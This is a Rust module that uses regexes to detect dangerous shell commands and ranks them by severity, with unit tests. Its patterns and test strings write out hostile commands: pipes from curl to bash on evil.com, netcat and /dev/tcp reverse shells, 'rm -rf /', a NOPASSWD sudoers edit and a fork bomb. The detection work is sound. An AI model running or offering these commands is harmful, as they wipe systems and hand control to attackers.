//! Dangerous Command Pattern Detection
//!
//! Regex-based detection of malicious shell commands including:
//! - Recursive deletion
//! - Remote script execution
//! - Reverse shells
//! - Privilege escalation
//! - Code obfuscation

use once_cell::sync::Lazy;
use regex::Regex;

/// A dangerous pattern with its compiled regex
#[derive(Debug)]
pub struct DangerousPattern {
    /// Pattern identifier
    pub id: &'static str,
    /// Human-readable description
    pub description: &'static str,
    /// Compiled regex
    regex: Regex,
    /// Severity level
    pub severity: Severity,
}

/// Severity level for dangerous patterns
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    /// High risk - should be blocked
    High,
    /// Medium risk - requires approval
    Medium,
    /// Low risk - warning only
    Low,
}

/// Result of a pattern match
#[derive(Debug, Clone)]
pub struct PatternMatch {
    /// Pattern that matched
    pub pattern_id: &'static str,
    /// Description of the danger
    pub description: &'static str,
    /// Severity level
    pub severity: Severity,
    /// The matched text
    pub matched_text: String,
}

impl DangerousPattern {
    /// Create a new dangerous pattern
    fn new(id: &'static str, description: &'static str, pattern: &str, severity: Severity) -> Self {
        Self {
            id,
            description,
            regex: Regex::new(pattern).expect("Invalid regex pattern"),
            severity,
        }
    }

    /// Check if the pattern matches the input
    pub fn matches(&self, input: &str) -> Option<PatternMatch> {
        self.regex.find(input).map(|m| PatternMatch {
            pattern_id: self.id,
            description: self.description,
            severity: self.severity,
            matched_text: m.as_str().to_string(),
        })
    }
}

/// All dangerous patterns (compiled once at startup)
static DANGEROUS_PATTERNS: Lazy<Vec<DangerousPattern>> = Lazy::new(|| {
    vec![
        // === Persistence & Privilege Escalation ===
        DangerousPattern::new(
            "rm_rf",
            "High-risk recursive delete",
            r"(?i)\brm\s+-[^\n]*-?r[^\n]*-?f[^\n]*\s+(?:-+\w+\s+)*([\x22\x27]?\/?[\w.*\-\s]*|\.)",
            Severity::High,
        ),
        DangerousPattern::new(
            "sudoers_nopasswd",
            "Sudoers modification for passwordless sudo",
            r"(?i)echo.*NOPASSWD.*>.*\/etc\/sudoers(?:\.d\/?[^\s]*)?",
            Severity::High,
        ),
        DangerousPattern::new(
            "systemd_service",
            "Systemd service persistence",
            r"(?i)(systemctl.*enable|.*\.service.*>\/etc\/systemd)",
            Severity::High,
        ),
        DangerousPattern::new(
            "crontab_modification",
            "Crontab modification for persistence",
            r"(?i)(crontab\s+-e|echo.*>.*crontab|.*>\s*\/var\/spool\/cron|.*\/etc\/cron\.(?:d|daily|hourly|weekly|monthly)\/)",
            Severity::High,
        ),
        DangerousPattern::new(
            "chmod_zero",
            "Permission removal",
            r"(?i)chmod\s+0{3,4}\b",
            Severity::Medium,
        ),

        // === Remote Script Execution ===
        DangerousPattern::new(
            "curl_pipe_shell",
            "Remote script execution via piped shell",
            r"(?i)(curl|wget)[\s\S]*?\|\s*(bash|sh|zsh|fish|csh|tcsh)",
            Severity::High,
        ),
        DangerousPattern::new(
            "bash_process_substitution",
            "Bash process substitution pulling remote content",
            r"(?i)bash\s*<\s*\(\s*(curl|wget)",
            Severity::High,
        ),
        DangerousPattern::new(
            "powershell_download_exec",
            "PowerShell remote download and execution",
            r"(?i)powershell.*DownloadString.*Invoke-Expression",
            Severity::High,
        ),

        // === Disk/Filesystem Operations ===
        DangerousPattern::new(
            "mkfs",
            "Filesystem formatting",
            r"(?i)\bmkfs\b|\bmkfs\.[a-z0-9]+",
            Severity::High,
        ),
        DangerousPattern::new(
            "disk_zero",
            "Disk zeroing",
            r"(?i)dd\s+if=\/dev\/(?:zero|null)",
            Severity::High,
        ),

        // === Code Obfuscation & Eval Patterns ===
        DangerousPattern::new(
            "base64_decode",
            "Base64 decoding (possible obfuscation)",
            r"(?i)base64\s+-d",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "base64_encoded_shell",
            "Base64-encoded shell execution",
            r"(?i)(echo|printf)\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+-d\s*\|\s*(bash|sh|zsh)",
            Severity::High,
        ),
        DangerousPattern::new(
            "openssl_enc",
            "OpenSSL encryption (possible obfuscation)",
            r"(?i)openssl\s+enc",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "python_eval",
            "Inline Python execution",
            r"(?i)python\s+-c",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "python_remote_exec",
            "Inline Python fetching and exec from network",
            r"(?i)python[23]?\s+-c\s+.*(urllib|requests).*exec",
            Severity::High,
        ),
        DangerousPattern::new(
            "perl_eval",
            "Inline Perl execution",
            r"(?i)perl\s+-e",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "node_eval",
            "Inline Node.js execution",
            r"(?i)node\s+-e",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "php_eval",
            "Inline PHP execution",
            r"(?i)php\s+-r",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "ruby_eval",
            "Inline Ruby execution",
            r"(?i)ruby\s+-e",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "eval_call",
            "Code evaluation (eval)",
            r"(?i)eval\s*\(+",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "exec_call",
            "Code execution (exec)",
            r"(?i)exec\s*\(+",
            Severity::Medium,
        ),

        // === Reverse Shells & Network Access ===
        DangerousPattern::new(
            "netcat_reverse",
            "Netcat reverse shell",
            r"(?i)nc\s+[\w.-]+\s+\d+\s+-e\s+\/bin\/sh",
            Severity::High,
        ),
        DangerousPattern::new(
            "alt_reverse_shell",
            "Reverse shell using shell -e semantics",
            r"(?i)(nc|netcat|bash|sh)\s+.*-e\s*(bash|sh|\/bin\/bash|\/bin\/sh)",
            Severity::High,
        ),
        DangerousPattern::new(
            "bash_reverse",
            "Bash reverse shell",
            r"(?i)bash\s+-i\s+>&",
            Severity::High,
        ),
        DangerousPattern::new(
            "dev_tcp_reverse",
            "Bash /dev/tcp reverse shell",
            r"(?i)\/dev\/tcp\/[\w.-]+\/\d+",
            Severity::High,
        ),
        DangerousPattern::new(
            "netcat_listener",
            "Netcat listener creation",
            r"(?i)\bnc\s+(-l|-p)\s+\d+",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "ssh_tunnel",
            "SSH tunnel/port forwarding",
            r"(?i)ssh\s+.*-[LRD]\s+\d+:",
            Severity::Medium,
        ),
        DangerousPattern::new(
            "docker_privileged",
            "Privileged Docker execution",
            // Simplified pattern: match --privileged without =false or =0
            r"(?i)docker\s+(run|exec)\s+.*--privileged(\s|=true|=1|$)",
            Severity::High,
        ),
        DangerousPattern::new(
            "fork_bomb",
            "Shell fork bomb",
            // Matches the classic :(){ :|:& };: pattern and variations
            r":\(\)\s*\{\s*:\s*\|\s*:.*\}",
            Severity::High,
        ),
    ]
});

/// Check input against all dangerous patterns
///
/// Returns a list of all matching patterns, sorted by severity (high first).
pub fn check_dangerous_patterns(input: &str) -> Vec<PatternMatch> {
    let mut matches: Vec<PatternMatch> = DANGEROUS_PATTERNS
        .iter()
        .filter_map(|p| p.matches(input))
        .collect();

    // Sort by severity (High first)
    matches.sort_by_key(|m| match m.severity {
        Severity::High => 0,
        Severity::Medium => 1,
        Severity::Low => 2,
    });

    matches
}

/// Check if input contains any high-severity dangerous pattern
pub fn has_high_severity_pattern(input: &str) -> bool {
    DANGEROUS_PATTERNS
        .iter()
        .any(|p| p.severity == Severity::High && p.regex.is_match(input))
}

/// Get the most severe pattern match
pub fn most_severe_match(input: &str) -> Option<PatternMatch> {
    check_dangerous_patterns(input).into_iter().next()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_detection() {
        assert!(has_high_severity_pattern("rm -rf /"));
        assert!(has_high_severity_pattern("rm -rf ~"));
        assert!(has_high_severity_pattern("rm -rf ."));
        assert!(has_high_severity_pattern("rm -rf /tmp"));
        assert!(!has_high_severity_pattern("rm file.txt"));
    }

    #[test]
    fn test_curl_pipe_bash_detection() {
        assert!(has_high_severity_pattern("curl http://evil.com | bash"));
        assert!(has_high_severity_pattern("wget http://evil.com/script.sh | sh"));
        assert!(has_high_severity_pattern("curl -s http://x.com/s | zsh"));
        assert!(!has_high_severity_pattern("curl http://api.com"));
    }

    #[test]
    fn test_reverse_shell_detection() {
        assert!(has_high_severity_pattern("nc 192.168.1.1 4444 -e /bin/sh"));
        assert!(has_high_severity_pattern("bash -i >& /dev/tcp/1.2.3.4/8080"));
        assert!(has_high_severity_pattern("/dev/tcp/attacker.com/443"));
    }

    #[test]
    fn test_fork_bomb_detection() {
        // Classic fork bomb pattern
        assert!(has_high_severity_pattern(":() { :|:& };:"));
        assert!(has_high_severity_pattern(":(){:|:&};:"));
    }

    #[test]
    fn test_sudoers_modification() {
        assert!(has_high_severity_pattern(
            "echo 'user ALL=NOPASSWD: ALL' >> /etc/sudoers"
        ));
    }

    #[test]
    fn test_docker_privileged() {
        assert!(has_high_severity_pattern("docker run --privileged ubuntu"));
        assert!(has_high_severity_pattern("docker exec --privileged=true container"));
        // Note: our simplified pattern would still match --privileged=false
        // because Rust regex doesn't support negative lookahead.
        // The full safety check should handle this edge case.
    }

    #[test]
    fn test_mkfs_detection() {
        assert!(has_high_severity_pattern("mkfs"));
        assert!(has_high_severity_pattern("mkfs.ext4 /dev/sda1"));
    }

    #[test]
    fn test_base64_encoded_shell() {
        // Pattern requires 20+ base64 characters to reduce false positives
        assert!(has_high_severity_pattern(
            "echo YmFzaCAtaQ==YmFzaCAtaQ== | base64 -d | bash"
        ));
        // Shorter base64 strings still get caught by base64_decode (medium severity)
        let matches = check_dangerous_patterns("echo YmFzaCAtaQ== | base64 -d | bash");
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_safe_commands() {
        // These should NOT trigger high severity patterns
        assert!(!has_high_severity_pattern("ls -la"));
        assert!(!has_high_severity_pattern("git status"));
        assert!(!has_high_severity_pattern("cat file.txt"));
        assert!(!has_high_severity_pattern("echo hello"));
    }

    #[test]
    fn test_medium_severity() {
        let matches = check_dangerous_patterns("python -c 'print(1)'");
        assert!(!matches.is_empty());
        assert_eq!(matches[0].severity, Severity::Medium);
    }

    #[test]
    fn test_multiple_matches() {
        let input = "curl http://evil.com | bash && rm -rf /";
        let matches = check_dangerous_patterns(input);
        assert!(matches.len() >= 2);
    }
}
